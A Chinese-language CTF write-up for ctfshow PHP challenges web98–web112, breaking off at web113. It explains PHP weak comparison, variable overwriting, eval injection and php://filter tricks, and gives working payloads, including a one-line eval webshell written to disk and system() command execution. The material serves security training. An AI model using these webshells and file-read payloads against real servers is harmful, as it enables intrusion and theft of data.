\n\n`008ee33a9d58b51cfeb425b0959121c9`\n\n还有一个特别的方法，是关于md5在弱比较下的缺点漏洞\n\n在弱比较中\n\n对于某些特殊的字符串加密后得到的密文以0e开头，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同。但是这里并不是弱比较，因此该方法不行，可以作为方法进行积累应用\n\n## web98\n\n```php\ninclude(\"flag.php\");\n$_GET?$_GET=&$_POST:'flag';\n$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';\n$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';\nhighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n?>\n```\n\n*$GET?$GET=&$_POST:'flag'--$_GET 变量是一个数组，内容是 GET 方法发送的变量名称和值，类似于字典。 如果 $_GET 变量不为空，则 $_GET 变量和 $_POST 变量指向同一个地址，即$_POST 变量内容会影响 $_GET 变量的内容。 如果 $_GET 变量为空，整个三元表达式的结果为 ’flag’。*\n\n$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';--如果 flag 变量值为 ’flag’，则 $_GET 变量和 $_COOKIE 变量指向同一个地址； 否则返回flag.\n\n$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';--如果flag变量值为’flag’，则 $_GET 变量和 $_SERVER 变量指向同一个地址； 否则返回flag。\n\nhighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);--如果 HTTP_FLAG 变量值为 ’flag’，输出 $flag，否则输出当前文件。\n\n知识点\n\n### 　　1、**if 语句简写**\n\n#### 　　　　（1）执行单条语句\n\n#### 　　　　（2）三目运算符\n\n　　　　　　格式：条件? 语句1: 语句2（条件为真，执行语句1；条件为假，执行语句2）\n\n　　　　　　if 语句格式 if(条件){语句1}else{语句2}\n\n#### 　　　　（3）符号 || &&\n\n### 　　2、**预定义变量**\n\n　　　　预定义变量都是关联数组类型\n\n　　　　（1）服务器变量：$_SERVER\n\n　　　　（2）HTTP GET变量：$_GET\n\n　　　　（3）HTTP POST变量：$_POST\n\n　　　　（4）HTTP cookies：$_COOKIE\n\n解题方法\n\n让$_GET['HTTP_FLAG']=='flag'，我们就应该用第一行的方法\n\n先GET传参随便传一个然后再POST传参HTTP_FLAG=flag\n\npayload:\n\n```\nget   flag=a\npost  HTTP_FLAG=flag\n```\n\n## web99\n\n```php\nhighlight_file(__FILE__);\n$allow = array();\nfor ($i=36; $i < 0x36d; $i++) { \n    array_push($allow, rand(1,$i));\n}\nif(isset($_GET['n']) && in_array($_GET['n'], $allow)){\n    file_put_contents($_GET['n'], $_POST['content']);\n}\n?>\n```\n\n先审一下代码：\n\n$allow = array();--创建了一个空数组 $allow，用来存储后续生成的随机数。\n\n**array_push**($allow, **rand**(1, $i))代码解释\n\n### 相关函数\n\n#### rand()函数\n\n- `rand()` 函数\n  - 这是 PHP 中的一个内置函数，用于生成一个随机整数。\n  - 语法为 `**rand(int $min, int $max)**`，其中 `$min` 是生成随机数的下限，`$max` 是上限。\n  - 在这里，`rand(1, $i)` 会生成一个介于 1 和 `$i`（当前循环迭代中的值）之间的随机整数。\n\n#### `array_push()`函数\n\n- `array_push()` 函数\n  - 这是 PHP 中用于向数组末尾添加一个或多个元素的函数。\n  - 语法为 `array_push(array &$array, mixed ...$values)`，其中 `$array` 是要添加元素的数组，`$values` 是一个或多个要添加的值。\n  - 在这里，`$allow` 是目标数组，而 `rand(1, $i)` 生成的随机数就是要添加的值。\n\n#### `in_array()` 函数\n\n- 这是 PHP 的一个内置函数，用于检查指定的值是否存在于数组中。\n\n- 语法是\n\n  ```php\n  in_array(mixed $needle, array $haystack, bool $strict = false)\n  ```\n\n  - **`$needle`**: 要搜索的值（在这个例子中是 `$_GET['n']`）。\n  - **`$haystack`**: 要搜索的数组（在这个例子中是 `$allow`）。\n  - **`$strict`**（可选）：如果为 `true`，则在比较时会进行类型检查。\n\n注:in_array()函数默认采用的是弱比较，在进行检查比较的时候回自动进行类型转换，我们来验证一下\n\n```php\n<?php\n$a='1.php';\n$b=array(1,2,3,4,5);\nif(in_array($a,$b)){\n    echo \"yes\";\n}\n\n #输出结果是yes，证明1和1.php是相等的，即通过了弱比较  \n```\n\n**in_array() 函数存在弱比较的漏洞，如果没有设置第三个参数，in_array()  函数在比较时默认是弱类型比较，这意味着它会进行自动类型转换。例如数组中的元素是整数，而搜索的值是字符串，PHP  会尝试将字符串转换为整数来进行比较。比如上面字符串类型的 1.php 就自动转换为了整数 1，也就符合在数组中的条件。**\n\n#### `file_put_contents()`函数\n\n- 这是 PHP 的一个内置函数，用于将字符串写入文件。如果文件不存在，它会创建一个新文件；如果文件已存在，它会覆盖原文件的内容。\n\n- 语法为\n\n  ```php\n  file_put_contents(string $filename, mixed $data, int $flags = 0, resource $context = null)\n  ```\n\n  - **`$filename`**: 要写入的文件名，通常是包含路径的字符串。\n  - **`$data`**: 要写入文件的内容，可以是字符串。\n  - **`$flags`**（可选）：可以使用的标志，例如 `FILE_APPEND` 来附加内容。\n  - **`$context`**（可选）：文件句柄的上下文\n  \n  记住，我们也可以通过伪协议将文件名写入\n\n返回来看题目\n\n已知for循环里面的i初始值为36，那么数组中必然存在1-36之间的数，所以这时候我们可以猜测其中的数字\n\n因为我们知道了in_array()是弱比较类型，所以我们可以直接构造数字+文件名去绕过验证\n\npayload:\n\n`?n=1.php`\t我个人觉得1的概率是最大了\n\n`content=<?php eval($_POST[1]);?>`\n\n分别用get和post传入参数\n\n之后访问1.php，再往一句话木马参数中传入命令或者用蚁剑进行连接，就可以拿到flag了\n\n## web100\n\n```php\nhighlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1=$_GET['v1'];\n$v2=$_GET['v2'];\n$v3=$_GET['v3'];\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif($v0){\n    if(!preg_match(\"/\\;/\", $v2)){\n        if(preg_match(\"/\\;/\", $v3)){\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n}\n?>\n```\n\n看到提示flag在class ctfshow中，那就访问看看，发现什么都没有\n\n解析代码\n\n#### is_numeric()函数\n\n`is_numeric()` 函数用于检测一个变量是否为数字或数字字符串这个函数返回一个布尔值：如果变量是数字或可以被转换为数字的字符串，则返回 `true`，否则返回 `false`。\n\n函数原型\n\n`bool is_numeric(mixed $var)`\n\n举个例子\n\n```php\n<?php\n// 示例 1: 整数\n$var1 = 123;\necho is_numeric($var1) ? 'true' : 'false'; // 输出: true\n// 示例 2: 浮点数\n$var2 = 123.45;\necho is_numeric($var2) ? 'true' : 'false'; // 输出: true\n// 示例 3: 数字字符串\n$var3 = \"123\";\necho is_numeric($var3) ? 'true' : 'false'; // 输出: true\n```\n\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3)\n\n- 这里是为了检查这三个变量是否都为数字或者数字字符串，并将结果存储在变量 `$v0` 中，如果三个布尔值为true，v0才会为true\n\nv0为true，进入if嵌套判断，要求v2不能包含；但v3得有；，最后执行eval语句\n\n但是这里要注意一个点:\n\n#### 运算符优先极\n\nv0赋值，赋值`=`的优先级高于逻辑运算。所以只要让is_numeric($v1)返回true即可满足if判断，所以v2和v3不需要为数字\n\n解题:\n\n对于v1：题目中v1没什么用处，所以v1直接设置一个数字或者数字字符串就可以了\n\nv1=1\n\n对于v2：在题目中可以看到后面有很多字符串，但当时没想到怎么利用这些字符串，就想着把后面的注释掉\n\nv2=var_dump($ctfshow)/*---这里加上(/\\*)就是为了注释掉，这里也可以用其他输出函数，或者用正常的命令执行函数也可以\n\n对于v3：因为v3需要闭合哪个注释符号，还需要带分号\n\nv3=\\*/;\n\n将这三个参数传入\n\npayload:\n\n?v1=1&v2=system('ls')/\\**&v3=\\**/;\n\n然后查看ctfshow.php\n\n需要将 0x2d 替换为 - ，结果再使用 ctfshow{} 包裹。\n\n## web101\n\n```php\nhighlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1=$_GET['v1'];\n$v2=$_GET['v2'];\n$v3=$_GET['v3'];\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif($v0){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\;|\\?|[0-9]/\", $v2)){\n        if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\?|[0-9]/\", $v3)){\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }   \n}\n?>\n```\n\n跟上题一样，但过滤了很多字符，这里的话我们先用脚本看一下有哪些字符是没有被过滤的\n\n```php\n<?php\nfor ($i=32;$i<127;$i++){\n        if (!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\;|\\?|[0-9]/\",chr($i))){\n            echo chr($i).\" \";\n        }\n}\n\n?>\n#输出结果\n# & ( : < > A B C D E F G H I J K L M N O P Q R S T U V W X Y Z ] a b c d e f g h i j k l m n o p q r s t u v w x y z | }\n```\n\n这里的话正常的命令函数是用不了了的，我一开始也没什么头绪，所以果断去看wp\n\n### 利用反射类查看类\n\n#### 反射类： ReflectionClass\n\n`ReflectionClass` 是 PHP 反射 API 中的一个类，专门用于对类的结构进行反射。通过 `ReflectionClass`，开发者可以在运行时获取有关类的详细信息，例如类的名称、方法、属性、常量等。它允许动态访问类的特性，从而使得程序能够更灵活地处理对象。\n\n用法:创建一个 ReflectionClass 实例\n\n`$reflection = **new** **ReflectionClass**('ClassName');`\n\n##### 常用方法\n\n1. **获取类的信息**\n   - `getName()`: 获取类的名称。\n   - `getShortName()`: 获取类的短名称（不包含命名空间）。\n   - `getNamespaceName()`: 获取类的命名空间。\n   - `getParentClass()`: 获取父类的反射对象（如果没有父类，则返回 `false`）。\n   - `getInterfaces()`: 获取类实现的所有接口。\n2. **获取类的属性**\n   - `getProperties()`: 获取类的所有属性，返回一个 `ReflectionProperty` 对象数组。\n   - `getProperty($name)`: 获取指定名称的属性的反射对象。\n3. **获取类的方法**\n   - `getMethods()`: 获取类的所有方法，返回一个 `ReflectionMethod` 对象数组。\n   - `getMethod($name)`: 获取指定名称的方法的反射对象。\n4. **获取类的常量**\n   - `getConstants()`: 获取类的所有常量。\n5. **创建类的实例**\n   - `newInstance()`: 创建类的实例。\n   - `newInstanceArgs(array $args)`: 使用参数创建类的实例。\n6. **检查可见性**\n   - `isInstantiable()`: 检查类是否可以被实例化。\n   - `isAbstract()`: 检查类是否为抽象类。\n   - `isFinal()`: 检查类是否为最终类。\n\npayload：v1=1&v2=echo new ReflectionClass&v3=;\n\n输入后就可以拿到flag，把0x2d换成-就可以，但注意这里flag少了一位需要爆破才能拿到\n\n## web102\n\n```php\n$v1 = $_POST['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v4 = is_numeric($v2) and is_numeric($v3);\nif($v4){\n    $s = substr($v2,2);\n    $str = call_user_func($v1,$s);\n    echo $str;\n    file_put_contents($v3,$str);\n}\nelse{\n    die('hacker');\n}\n?>\n\n```\n\n我们只介绍新的知识点\n\n### 相关函数\n\n#### `substr()` 函数\n\n是 PHP 中用于提取字符串子部分的一个非常有用的函数。它可以从指定的位置开始提取字符串的部分内容，并且可以选择性地指定提取的长度。\n\n`substr()` 函数的基本语法\n\n```php\nstring substr(string $string, int $start, int $length = null)\n```\n\n- **`$string`**: 要提取子字符串的原始字符串。\n- **`$start`**: 开始提取的起始位置（以 0 开始计数）。如果为负数，则表示从字符串末尾开始的偏移量。\n- **`$length`**: 提取的子字符串的长度（可选）。如果省略，`substr()` 将提取到字符串的末尾。如果为负数，则表示从提取的末尾开始的长度。\n\n#### call_user_func()函数\n\ncall_user_func() 调用方法或变量,第一个参数是调用的对象，第二个参数是被调用对象的参数\n\ncall_user_func()函数的基本语法\n\n```php\nmixed call_user_func(callable $callback, mixed ...$parameters)\n```\n\n参数说明\n\n- **`$callback`**: 要调用的函数名、方法名或者是一个包含对象和方法名的数组。可以是字符串、数组（对象和方法名）或匿名函数。\n- **`$parameters`**: 传递给回调函数的参数，可以是一个或多个参数。使用可变参数（...）的方式可以传递任意数量的参数。\n\n代码审计:\n\n$s = substr($v2,2);--从$v2的第二个字符开始截取字符串赋值给$s\n\n$str = call_user_func($v1,$s);--调用v1指定的函数，然后将s作为参数传递给函数，并将函数的返回值赋值给str\n\nfile_put_contents($v3,$str);--将str写入v3指定的文件中\n\n解题:\n\n这里要求v2必须为数字或者数字字符串，而且还会将v2从第三位数字开始截取并作为参数进入v1函数，而后将形成的payload写入v3文件中\n\n如果v2必须为数字且v2得包含shell的话，就应该对v2的shell进行编码了\n\npayload:\n\n```php\n$a = '<?=`cat *`;'; // 定义一个字符串，包含 PHP 的短标签和一个 shell 命令\n$b = base64_encode($a); // 将字符串进行 Base64 编码\n$c = bin2hex($b); // 将 Base64 编码后的字符串转换为十六进制格式\necho $c; // 输出十六进制字符串\n```\n\n这里的话对v2的basse64编码后的字符串进行了二进制转化，所以我们的外围函数v1应该是一个可以进行解码的函数，所以我们v1设为hex2bin，但是当我们的shell进行base64编码后，发现多出了一个等于号，我们得把他去掉，不然在进行hex解码的时候末尾会出现3d，去掉不会对结果造成影响\n\n#### hex2bin()函数\n\n`hex2bin()` 是 PHP 中的一个函数，用于将十六进制字符串转换为二进制字符串\n\n`hex2bin()` 的基本语法\n\n```php\nstring hex2bin(string $hex_string)\n```\n\nbin2hex()函数就是相反的了\n\n注意，我们的 payload 是从 v2 第三位开始的，因此前面需要增加两个数字，绕过 substr 函数。 \n\n最终的paylaod就是:\n\nGET:v2=11504438395948526859794171594473&v3=php://filter/write=convert.base64-decode/resource=1.php\n\nPOST:v1=hex2bin\n\n正常来说对于file_put_contents()的话应该是第一个参数是文件名第二个参数是文件内容，但因为这里对v2进行了相关的处理，导致我们需要对v2传入设立了，所以v3想写成文件名的话就需要我们利用伪协议去写文件名\n\n所以这就是为什么v3传入伪协议的原因\n\n我们正常传入三个参数后会有回显信息，页面上的编码就是我们传入的shell\n\n![image-20241112160124152](./../image/achieve/202411/php特性---ctfshow/image-20241101204319309.png)\n\n访问我们的木马，然后在源代码中就可以看到我们的flag了\n\n## web103\n\n```php\n$v1 = $_POST['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v4 = is_numeric($v2) and is_numeric($v3);\nif($v4){\n    $s = substr($v2,2);\n    $str = call_user_func($v1,$s);\n    echo $str;\n    if(!preg_match(\"/.*p.*h.*p.*/i\",$str)){\n        file_put_contents($v3,$str);\n    }\n    else{\n        die('Sorry');\n    }\n}\nelse{\n    die('hacker');\n}\n\n?>\n```\n\n这道题比之前增加了验证\n\n### preg_match中*/的作用\n\n- **`.\\*`**: 表示零个或多个任意字符（除了换行符）。`.*` 的含义是可以匹配任意字符的任意数量（包括零个字符）。\n\n代码中的意思就是如果php之间有其他分割的字符，都会被当作php进行处理\n\n这道题其实和上一题是一样的，但需要注意的是写马的时候注意不要有php字符串，可以用php短标签去进行绕过一句话木马的php\n\n，用通配符去匹配flag文件的php后缀，而我们的参数中只有v3是带有php的，但正则匹配不影响v3，所以正常做就可以了\n\n## web104\n\n```php\ninclude(\"flag.php\");\n\nif(isset($_POST['v1']) && isset($_GET['v2'])){\n    $v1 = $_POST['v1'];\n    $v2 = $_GET['v2'];\n    if(sha1($v1)==sha1($v2)){\n        echo $flag;\n    }\n}\n?>\n```\n\n### 相关函数\n\n#### sha1()函数\n\n在 PHP 中，`sha1()` 是一个用于计算字符串的 SHA-1 哈希值的函数\n\nsha1()函数的基本语法\n\n`string sha1(string $str, bool $raw_output = false)`\n\n- **`$str`**：要哈希的字符串。\n- **`$raw_output`**：一个可选参数。如果设置为 `true`，则返回原始的二进制数据；如果为 `false`（默认值），则返回十六进制格式的字符串。\n\n举例子:\n\n```php\n<?php\n$a = \"hello world\";\n$hash = sha1($a);\necho $hash;\n\n#输出sha-1哈希值2aae6c35c94fcfb415dbe95f408b9ce91ee846ed\n```\n\n这里没有设置第二个参数，默认为返回十六进制格式的哈希值\n\n如果是二进制的话，那就设置一下sha1函数中第二个参数为true就可以了\n\n只要v1和v2sha1哈希值相等就行了，严重怀疑这道题是拿来凑数的哈哈哈哈\n\n## web105\n\n![image-20241112161937164](./../image/achieve/202411/php特性---ctfshow/image-20241112161937164.png)\n\n### 相关函数\n\n#### foreach()函数\n\n在 PHP 中，`foreach` 是一个用于遍历数组的控制结构。\n\nforeach的基本语法\n\n```php\nforeach ($array as $value) {\n    // 对于每个数组元素执行的代码\n}\n\n```\n\n#### $$a=$$b\n\n`$$key = $$value;` 是一个使用可变变量的表达式\n\n首先我们应该先理解一下这个$$key=$$value，存在两个`$`的等式，可以使用php的变量覆盖\n\n可变变量在 PHP 中允许你通过一个变量的值来创建另一个变量。例如：\n\n```\n$foo = \"bar\";  // 这里定义了一个变量 $foo，值为 \"bar\"\n$$foo = \"baz\"; // 这里创建了一个新的变量 $bar，值为 \"baz\"\n```\n\n在这个例子中，`$$foo`实际上是 `$bar`，所以执行后，`$bar` 的值将是 `\"baz\"`。\n\n代码审计:\n\n**`foreach ($_GET as $key => $value)`**: 对 `$_GET` 数组进行遍历。,$key为数组中的键，而$value为值\n\n第一个if语句要求key键中不能有error，例如我们get传参?error=1则会i返回what are you doing\n\n第二个if语句要求value值不能等于flag，不然就会执行die函数\n\n解题\n\n分析代码：尝试让`$suces`或者`$error`存放flag值，两个foreach语句后都里一个`$$key=$$value`，可以让参数名是suces或error，值传递flag，则`$$key`是`$suces`或`$error`，`$$value`是`$flag`。\n\n因为get限制了key不能error，所以参数名为suces，由于post里value值不能是flag，所以用get传递。post的代码在get之后执行，可以让`$error`的值为`$suces`，这样三个变量都是flag值，那么后面的语句，无论判断结果如何，都会输出flag。\n\npayload:\n\nGET传入suces=flag\n\nPOST传入error=suces\n\n这题妙就妙在通过 $flag 替换 $error，然后在倒数第二步 die($error) 的时候输出的就是 flag\n\n## web106\n\n```php\ninclude(\"flag.php\");\nif(isset($_POST['v1']) && isset($_GET['v2'])){\n    $v1 = $_POST['v1'];\n    $v2 = $_GET['v2'];\n    if(sha1($v1)==sha1($v2) && $v1!=$v2){\n        echo $flag;\n    }\n}\n```\n\n104一样，但多了一个条件就是v1不能等于v2\n\n解题:\n\n令两个参数的sha1哈希值一样但不是同一个参数就可以了\n\npaylaod\n\n#法一\nget  v2[]=1\npost v1[]=2\n\n#法二 sha1 碰撞#sha1加密后均为 0e 开头，弱比较会被字母截断成0\nget v2=10932435112\npost v1=aaroZmOk\n\n其实跟常规的md5绕过差不多\n\n## web107\n\n```php\nif(isset($_POST['v1'])){\n    $v1 = $_POST['v1'];\n    $v3 = $_GET['v3'];\n       parse_str($v1,$v2);\n       if($v2['flag']==md5($v3)){\n           echo $flag;\n       }\n\n}\n?>\n```\n\n### 相关函数\n\n#### parse_str()\n\n在 PHP 中，`parse_str()` 是一个用于解析查询字符串并将其转换为变量数组的函数\n\nparse_str()函数的基本语法\n\n```php\nparse_str(string $string, array &$array = null): void\n```\n\n- **`$string`**：要解析的查询字符串。\n- **`$array`**（可选）：如果提供，则解析后的变量会被存储在这个数组中。否则，解析后的变量会直接导入到当前的符号表（即可以直接使用变量名）。\n\n解题:\n\n这里需要让v2中flag等于v3的md5值，而v2来自于v1组成的数组，如果v1中没有flag，则v2数组flag的值为null，那我们如果给v3传入一个数组，md5后结果也为null\n\n对本题而言\n\n### 解法1：\n\n我们只要满足v3的md5等于v2[flag]即可。可以传递给v3任意值，然后v1=flag=v3的md5值，具体传递的值根据v3确定，v3经过md5后弱等于v2，那么md5后0e开头即可让md5的结果为0，所以让v2的flag变量值为0。\n\npayload:\n\nGET传入v3=QNKCDZO\n\nPOST传入v1=flag=0\n\n### 解法2：\n\n我们传入v3[]=1，则md5($v3)就是null 这时候v1随便传,也可以满足`if($v2['flag']==md5($v3))`\n\n## web108\n\n```php\ninclude(\"flag.php\");\nif (ereg (\"^[a-zA-Z]+$\", $_GET['c'])===FALSE)  {\n    die('error');\n}\n//只有36d的人才能看到flag\nif(intval(strrev($_GET['c']))==0x36d){\n    echo $flag;\n}\n?>\n```\n\n### 相关函数\n\n#### ereg函数\n\n是PHP旧版本中用于正则表达式匹配的函数，跟preg_match函数作用是一样的,\n\n#### strrev()函数\n\n`strrev`是PHP内置的字符串函数，用于将字符串进行反转。它接受一个字符串作为参数，并返回反转后的结果。\n\n解题\n\n### 00截断绕过ereg函数\n\n ereg函数存在NULL截断漏洞，可以绕过正则过滤，使用%00截断。\n\npayload:c=a%00778\n\n## web109\n\n```php\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){\n            eval(\"echo new $v1($v2());\");\n    }\n}\n?>\n```\n\n解题:\n\n采用php的内置类进行解题\n\n首先我们要了解到，这里的echo是把v1当成字符串进行输出，那可以想到当一个实例化对象被当作字符产输出的时候会触发什么方法，答案就是__string()魔术方法，那我们把带有这个方法的类列出来\n\nCachingIterator::__toString()\nDirectoryIterator::__toString\nError::__toString\nException::__toString\n\n根据这些类，我们可以通过触发tostring魔术方法进行命令执行\n\npyload:\n?v1= CachingIterator&v2=system(ls)\n?v1= DirectoryIterator&v2=system(ls)\n?v1= Error&v2=system(ls)\n?v1= Exception&v2=system(ls) \n\n查看目录后直接cat到flag就可以了\n\n## web110\n\n```php\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n    if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v2)){\n            die(\"error v2\");\n    }\n    eval(\"echo new $v1($v2());\");\n}\n?>\n```\n\n看到这么多被过滤的字符也是瞬间昏头了哈哈哈，没关系，我们先用脚本把没被过滤的字符串输出出来\n\n```php\n<?php\nfor ($i=32;$i<127;$i++){\n        if (!preg_match(\"/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/\",chr($i))){\n            echo chr($i).\" \";\n        }\n}\n\n?>\n #没被过滤的字符:< > A B C D E F G H I J K L M N O P Q R S T U V W X Y Z ] a b c d e f g h i j k l m n o p q r s t u v w x y z | } \n```\n\n这里的话过滤了大部分字符，正常的手法都行不通了，那就试一下新方法\n\n```\nfilesystemiterator 遍历文件类\ngetcwd()函数 获取当前工作目录 返回当前工作目录\n```\n\n### Filesystemiterator类遍历目录\n\n`FilesystemIterator`类是PHP中用于遍历文件系统的一个迭代器类。它可以用于遍历指定目录下的文件和子目录。\n\n### getcwd函数获取目录\n\n`getcwd()`函数是PHP中的一个内置函数，用于获取当前工作目录的路径。\n\n语法:\n\n```php\nstring getcwd(void**)\n```\n\n具体用法:\n\n```php\n$currentDir = getcwd();\necho \"当前工作目录是：$currentDir\";\n```\n\n类`FilesystemIterator`可以用来遍历目录，需要一个路径参数\n函数`getcwd`可以返回当前工作路径且不需要参数，由此可以构造payload\n/?v1=FilesystemIterator&v2=getcwd\n\n## web111\n\n```php\nfunction getFlag(&$v1,&$v2){\n    eval(\"$$v1 = &$$v2;\");\n//将v2的地址传给v1\nvar_dump($$v1); \n//打印v1\n}\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n    if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\<|\\>/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\<|\\>/', $v2)){\n            die(\"error v2\");\n    } \n    if(preg_match('/ctfshow/', $v1)){\n            getFlag($v1,$v2);\n    }\n}\n```\n\n常规先看看过滤了哪些东西，这次能用的只有大小写字母和|和}符号了\n\n解析代码\n\n### eval(\"$$v1 = &$$v2;\");\n\n1. `$$v1`是一个变量变量，它的值将由`$v1`的值决定。例如，如果`$v1`的值为 `\"x\"`，那么`$$v1`就等同于 `$x`。\n2. `&` 是引用操作符，用于创建一个变量的引用。\n3. `$$v2`也是一个变量变量，它的值将由`$v2`的值决定。\n4. `$$v1 = &$$v2;` 表示将`$$v2`的引用赋值给`$$v1`，即`$v1`成为`$v2`的引用。\n\n因为我们并不知道flag在哪，所以我们可以用PHP的$GLOBALS超全局变量\n\n### $GLOBALS超全局变量\n\n`$GLOBALS` 是一个在 PHP 中预定义的超全局变量，它是一个包含全局作用域中所有全局变量的关联数组。\n\n`$GLOBALS` 数组的键是全局变量的名称，值是对应全局变量的引用。通过 `$GLOBALS` 数组，可以在任何作用域中访问和操作全局变量，而不需要使用 `global` 关键字。\n\n举个例子:\n\n```php\n$x = 10;\n$y = 20;\n\nfunction sum() {\n    $result = $GLOBALS['x'] + $GLOBALS['y'];\n    return $result;\n}\n\necho sum();  // 输出 30\n\n```\n\n我们定义了两个全局变量 `$x` 和 `$y`，然后在 `sum()` 函数中使用 `$GLOBALS` 数组访问这两个全局变量，实现了对它们的求和操作。\n\n构造payload:\n\n```php\n?v1=ctfshow&v2=GLOBALS\n```\n\n![image-20241113224940047](./../image/achieve/202411/php特性---ctfshow/image-20241113224940047.png)\n\n注意 PHP 的函数具有词法作用域\n\n在函数内部无法调用外部的变量，除非进行传参。这道题无非注意以下几点：\n\n1. 我们最终要得到 $flag 的值，就需要 var_dump($$v1) 中的 $v1 为 flag，即 $v2 要为 flag，这样 $$v2 就为 $flag，&$$v2 就为 $flag 对应的值\n2. URL 传参时 $v2 不能直接传为 flag，否则 $flag 会因“函数内部无法调用外部变量”的限制而导致其返回 null\n3. 要想跨过词法作用域的限制，我们可以用 GLOBALS 常量数组，其中包含了 $flag 键值对，就可以将 $flag 的值赋给 $$v1\n\n## web112\n\n```php\nfunction filter($file){\n    if(preg_match('/\\.\\.\\/|http|https|data|input|rot13|base64|string/i',$file)){\n        die(\"hacker!\");\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n}\n```\n\n**要求**：file 不能是文件，且不能使用 http、https、data 伪协议，不能使用 input 参数，不能使用 rot13、base64、string 过滤器\n\n### is_file()函数\n\n```\nis_file()` 函数用于判断给定的路径是否是一个文件，如果是则返回 `true`，否则返回 `false\n```\n\n基础语法:\n\n```php\nbool is_file ( string $filename )\n```\n\n参数 `$filename` 是要检查的文件路径。需要注意的是，这个函数只能用于检查文件，不能用于检查文件夹。\n\n#### 要点:当is_file的参数为伪协议时，返回值为false\n\n解题:\n\n### 解法一:直接用包装器伪协议\n\n#### filter包装器\n\n`filter` 包装器是 PHP 中用于在数据流中应用过滤器的一种特殊包装器。它允许你通过指定过滤器来对数据进行过滤、修改或转换。\n\n使用 `filter` 包装器，你可以对输入和输出进行过滤操作，包括数据验证、数据清理、编码转换等。它提供了一种方便的方式来处理各种数据流，如文件、网络连接、字符串等。\n\n基础用法：\n\n```php\nfilter://data\n```\n\n`filter` 是要应用的过滤器的名称，`data` 是要过滤的数据。\n\n这里限制了很多伪协议，但是我们可以发现php://filter伪协议还是可以用的\n\npayload:\n\n?file=php://filter/resource=flag.php\n\n### (重)解法二:用过滤器进行转换\n\n因为这题限制了字符，所以我们选择限制字符以外的过滤器即可\n\n- #### php://filter/read=convert.quoted-printable-encode/resource=flag.php\n\n`convert.quoted-printable-encode` 是过滤器，用于将文件内容转换为 quoted-printable 编码\n\n- #### compress.zlib://flag.php\n\n`compress.zlib://flag.php` 是另一种 PHP 包装器（wrapper），用于读取经过 zlib 压缩的文件内容\n\n- #### php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\n\n`convert.iconv.UCS-2LE.UCS-2BE` 是一个过滤器，用于将 `flag.php` 文件内容从 UCS-2LE 编码转换为 UCS-2BE 编码。\n\n- #### php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php\n\n`convert.iconv.utf-8.utf-16le` 是一个 `php://filter` 包装器中的过滤器，用于将 UTF-8 编码的文本转换为 UTF-16LE 编码。\n\n- #### php://filter/read=convert.quoted-printable-encode/resource=flag.php\n\n`convert.quoted-printable-encode` 是一个内置的 PHP 过滤器，用于将数据转换为 Quoted-Printable 编码\n\n## web113\n\n```php\nfunction filter($file){\n    